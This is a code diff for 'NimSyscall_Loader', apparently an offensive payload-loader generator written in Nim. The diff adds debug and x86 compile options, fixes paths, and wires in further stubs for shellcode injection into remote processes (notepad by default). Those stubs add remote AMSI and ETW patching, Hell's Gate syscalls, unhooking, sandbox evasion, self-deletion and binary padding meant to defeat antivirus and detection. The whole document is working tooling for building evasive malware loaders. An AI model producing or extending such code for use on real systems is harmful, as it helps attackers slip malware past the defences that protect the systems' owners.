@@ -55,7 +55,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.3
 
 Usage:
-  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --noArgs --peinject --peload --hellsgate --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions]
+  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --noArgs --peinject --peload --hellsgate --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --x86]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -96,6 +96,8 @@ Options:
   --domain targetdomain    Specify a domain for SandBox Evasion
   --self-delete    The loader deletes it's own executable on runtime (Credit to @byt3bl33d3r and @jonasLyk)
   --obfuscatefunctions    Obfuscate some Nim specific Windows API's from the IAT via CallObfuscator (https://github.com/d35ha/CallObfuscator - only possible from a Windows OS)
+  --debug    Compiles the binary in debug mode (More DInvoke output)
+  --x86    (Compiles an x86 binary - have to cast some more function values before this works smoothly)
 """
 
 if (paramCount() == 0):
@@ -107,7 +109,8 @@ if (paramStr(1) == "-h"):
 
 var 
     filename: string = ""
-    outfile: string = "Loader.exe"
+    packerPath = os.getAppDir()
+    outfile: string = packerPath
     envkey: string = "TARGETDOMAIN"
     remoteprocesses : seq[string]
     targetdomain : string = ""
@@ -141,6 +144,13 @@ var
     pump: bool = false
     pumpfmt: string = ""
     pumpargs: seq[string]
+    debugMode: bool = false
+    compileX86: bool = false
+
+when system.hostOS == "windows":
+    outfile.add("\\Loader.exe")
+else:
+    outfile.add("/Loader.exe")
 
 let args = docopt(helpmenu, version = "NimSyscall_Loader 1.3")
 
@@ -244,6 +254,12 @@ if args["--self-delete"]:
 
 if args["--obfuscatefunctions"]:
   callobfs = true
+
+if args["--debug"]:
+  debugMode = true
+
+if args["--x86"]:
+  compileX86 = true
 
 var blob: string
 #Read file and if PE convert to shellcode before
@@ -556,9 +572,9 @@ proc genEnglishwords (nuofWords: int): string =
     var output: seq[string]    
     var dictionary: string
     when system.hostOS == "windows":
-        dictionary = "Dicts\\englishwords.txt"
+        dictionary = fmt"{packerPath}\\Dicts\\englishwords.txt"
     else:
-        dictionary = "Dicts/englishwords.txt"
+        dictionary = fmt"{packerPath}\\Dicts/englishwords.txt"
     for line in lines dictionary:
       englishdicts.add(line)
     for i in 1 .. numberofWords:
@@ -588,9 +604,9 @@ proc genTrustedwords (nuofWords: int): string =
     var output: seq[string]    
     var dictionary: string
     when system.hostOS == "windows":
-        dictionary = "Dicts\\trustedStrings.txt"
+        dictionary = fmt"{packerPath}\\Dicts\\trustedStrings.txt"
     else:
-        dictionary = "Dicts/trustedStrings.txt"
+        dictionary = fmt"{packerPath}/Dicts/trustedStrings.txt"
     for line in lines dictionary:
       trusteddicts.add(line)
     for i in 1 .. numberofWords:
@@ -650,7 +666,6 @@ if(gosleep):
 
 if(unhook):
     if(hellsgate):
-        stub.add(HellsgateDInvokeBaseStub)
         stub.add(DInvokeUnhookStubs)
         stub.add(Winimleanstub)
         stub.add(HellsgateStub)
@@ -679,9 +694,7 @@ if (AMSI or ETW or peload or (localinject == false)):
     if ("LoadLibraryA_t* = proc" in stub) == false:
         stub.add(DInvokeLoadLibraryAGetProcAddress)
 
-if (hellsgate):
-    if ("OpenProcess_HASH * = 3768626" in stub) == false:
-        stub.add(HellsgateDInvokeBaseStub)  
+if (hellsgate): 
     stub.add(WinLeanGetCurrentProcStub)
     if ("https://doxygen.reactos.org/d3/d71/struct__ASSEMBLY__STORAGE__MAP__ENTRY.html" in stub) == false:
         stub.add(HellsgateStub)
@@ -725,7 +738,8 @@ if (hellsgate):
         if ("NtClose(" in stub) == false:
             stub.add(HellsgateNtCloseDelegate)
         if (processname == ""):
-            stub = stub & HellsgateNotepadProcIDStub
+            stub = stub & HellsgateNotepadProcIDStub & DInvokeGetModuleHandleADelegate
+            stub.add(SleepStubFirst)
             if (remoteETWpatch):
                 if ("NtProtectVirtualMemory(" in stub) == false:
                     stub.add(HellsgateProtectDelegate)
@@ -787,7 +801,7 @@ if (peload):
 if (shellcode):
     if ("PS_ATTR_UNION" in stub) == false:
         stub.add(GetSyscallStub)
-    if (AMSI or ETW):
+    if (AMSI or ETW or remoteETWpatch or remoteAMSIpatch):
         if ("myNtProtectVirtM = pro" in stub) == false:
             stub.add(NtProtectVirtualMemoryDelegate)
             stub.add(NtProtectSyscallStart)
@@ -810,18 +824,24 @@ if (shellcode):
         stub = stub & LocalInjectDelegates & ShellcodelocalStub
     else:
         stub.add(RemoteProcImportStub)
+        stub.add(DInvokeGetModuleHandleADelegate)
         if (processname == ""):
             stub = stub & RemoteInjectDelegates & NotepadProcIDStub
+            stub.add(SleepStubFirst)
             if (remoteETWpatch):
+                stub.add(RemoteLoadNTDLLStub)
                 stub.add(RemotePatchETWStub)
             if (remoteAMSIpatch):
+                stub.add(RemoteLoadAMSIStub)
                 stub.add(RemotePatchAMSIStub)
             stub = stub & ShellcoderemoteinjectStub_notepad & ShellcoderemoteinjectStub  
         else:
             stub = stub & RemoteInjectDelegates & ShellcoderemoteinjectStub_customprocfirst & ShellcoderemoteinjectStub_customprocseccond & ShellcoderemoteinjectStub_customprocID
             if (remoteETWpatch):
+                stub.add(RemoteLoadNTDLLStub)
                 stub.add(RemotePatchETWStub)
             if (remoteAMSIpatch):
+                stub.add(RemoteLoadAMSIStub)
                 stub.add(RemotePatchAMSIStub)
             stub = stub & ShellcoderemoteinjectStub_customprocthird & ShellcoderemoteinjectStub
 
@@ -863,6 +883,9 @@ if(pump):
         if(m == "words"):
             stub.add(genEnglishwords(rand(4750..7800)))
 
+if debugMode:
+    stub =  stub.replace("import strenc", "")
+
 writeFile("Loader.nim", stub)
 echo "Written Loader.nim, compiling -> \n\n"
 
@@ -897,6 +920,9 @@ when system.hostOS == "windows":
 elif system.hostOS == "linux":
     basicCompileFlags = "nim c -d:release -d=mingw --hint:all:off --warning:all:off -d:danger -d:strip --opt:size "
 
+if compileX86:
+    basicCompileFlags.add("--cpu:i386 ")
+
 if(hide):
     basicCompileFlags.add("--app=gui ")
 else:
@@ -911,7 +937,21 @@ if (hellsgate):
 else:
     basicCompileFlags.add("--passc=-flto --passl=-flto ")
 
+# for e.g. CNA Scripts
+when system.hostOS == "windows":
+    basicCompileFlags.add(fmt"-p:""{packerPath}"" ")
+else:
+    basicCompileFlags.add(fmt"-p:'{packerPath}' ")
+
 basicCompileFlags.add(fmt"--out={outfile} Loader.nim")
+
+
+if debugMode:
+    basicCompileFlags =  basicCompileFlags.replace("-d:release", "")
+    basicCompileFlags =  basicCompileFlags.replace("--hint:all:off --warning:all:off -d:danger -d:strip --opt:size", "")
+    basicCompileFlags = basicCompileFlags.replace("--app=console --passc=-flto --passl=-flto", "")
+
+
 echo "Compile command:"
 echo basicCompileFlags
 echo "\n\n"
